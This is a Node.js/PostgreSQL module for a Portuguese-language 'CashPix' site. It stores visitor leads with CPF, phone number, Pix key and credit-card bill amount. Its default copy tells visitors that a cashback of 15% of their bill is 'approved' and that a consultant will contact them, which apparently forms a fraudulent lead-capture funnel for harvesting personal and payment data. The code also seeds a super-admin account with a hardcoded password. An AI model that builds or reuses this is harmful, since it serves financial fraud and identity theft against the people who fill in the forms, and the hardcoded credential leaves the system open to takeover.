const { Pool } = require('pg');
const bcrypt = require('bcryptjs');

let pool;
let initialized = false;

function getPool() {
  if (!pool) {
    pool = new Pool({
      connectionString: process.env.DATABASE_URL,
      ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false,
    });
  }
  return pool;
}

async function initDb() {
  if (initialized) return;
  const client = await getPool().connect();
  try {
    await client.query(`
      CREATE TABLE IF NOT EXISTS leads (
        id SERIAL PRIMARY KEY,
        nome TEXT NOT NULL,
        cpf TEXT NOT NULL,
        telefone TEXT NOT NULL,
        chave_pix TEXT NOT NULL,
        tipo_chave TEXT NOT NULL,
        fatura NUMERIC NOT NULL,
        cashback NUMERIC NOT NULL,
        status TEXT DEFAULT 'novo',
        consultor TEXT,
        atendido_por TEXT,
        observacao TEXT,
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT NOW()
      );

      CREATE TABLE IF NOT EXISTS admins (
        id SERIAL PRIMARY KEY,
        nome TEXT NOT NULL,
        email TEXT UNIQUE NOT NULL,
        senha_hash TEXT NOT NULL,
        role TEXT DEFAULT 'consultor',
        created_at TIMESTAMP DEFAULT NOW()
      );

      CREATE TABLE IF NOT EXISTS site_config (
        chave TEXT PRIMARY KEY,
        valor TEXT NOT NULL,
        updated_at TIMESTAMP DEFAULT NOW()
      );
    `);

    await client.query(`ALTER TABLE leads ADD COLUMN IF NOT EXISTS user_agent TEXT`);
    await client.query(`ALTER TABLE leads ADD COLUMN IF NOT EXISTS atendido_por TEXT`);
    await client.query(`ALTER TABLE leads ADD COLUMN IF NOT EXISTS observacao TEXT`);

    const { rows: existing } = await client.query('SELECT id FROM admins WHERE email = $1', ['admin@cashpix.com']);
    if (existing.length === 0) {
      const hash = await bcrypt.hash('Admin@2024!', 12);
      await client.query(
        'INSERT INTO admins (nome, email, senha_hash, role) VALUES ($1, $2, $3, $4) ON CONFLICT (email) DO NOTHING',
        ['Administrador', 'admin@cashpix.com', hash, 'super_admin']
      );
    }

    const defaults = {
      marca_nome: 'CashPix', marca_slogan: 'Resgate seu cashback em 5 passos',
      cor_principal: '#254F9B', cor_botao: '#C20016', cor_fundo: '#f5f7fa', cor_texto: '#1a1a1a',
      cashback_percent: '15', prazo_pagamento: '24h',
      mensagem_final: 'Tudo certo, {nome}! Seu cashback de R$ {valor} foi aprovado. Um consultor vai entrar em contato em breve.',
      whatsapp_consultor: '', botao_topo_texto: 'Resgatar cashback agora',
      titulo_principal: 'Você tem cashback acumulado esperando por você!',
      subtitulo: 'Resgate agora direto no Pix, sem complicação.',
      passo1_pergunta: 'Você possui cartão de crédito?',
      passo2_pergunta: 'Qual o valor da sua última fatura?',
      passo3_titulo: 'Seu cashback está pronto!',
      passo3_pergunta: 'Escolha o tipo de chave Pix para receber:',
      passo4_pergunta: 'Qual é o seu número de telefone?',
      passo5_pergunta: 'Confirme seus dados para liberar o cashback:',
      rodape_legal: 'CashPix é um serviço de cashback. Consulte nossos termos de uso.',
    };
    for (const [k, v] of Object.entries(defaults)) {
      await client.query('INSERT INTO site_config (chave, valor) VALUES ($1, $2) ON CONFLICT (chave) DO NOTHING', [k, v]);
    }

    initialized = true;
    console.log('[DB] Inicializado.');
  } finally {
    client.release();
  }
}

async function getConfig() {
  await initDb();
  const { rows } = await getPool().query('SELECT chave, valor FROM site_config');
  const config = {};
  for (const row of rows) config[row.chave] = row.valor;
  if (!config.cor_fundo) config.cor_fundo = '#f5f7fa';
  if (!config.cor_texto) config.cor_texto = '#1a1a1a';
  if (!config.cor_botao) config.cor_botao = '#C20016';
  return config;
}

async function setConfig(chave, valor) {
  await initDb();
  await getPool().query(
    `INSERT INTO site_config (chave, valor, updated_at) VALUES ($1, $2, NOW()) ON CONFLICT (chave) DO UPDATE SET valor = $2, updated_at = NOW()`,
    [chave, valor]
  );
}

module.exports = { getPool, initDb, getConfig, setConfig };
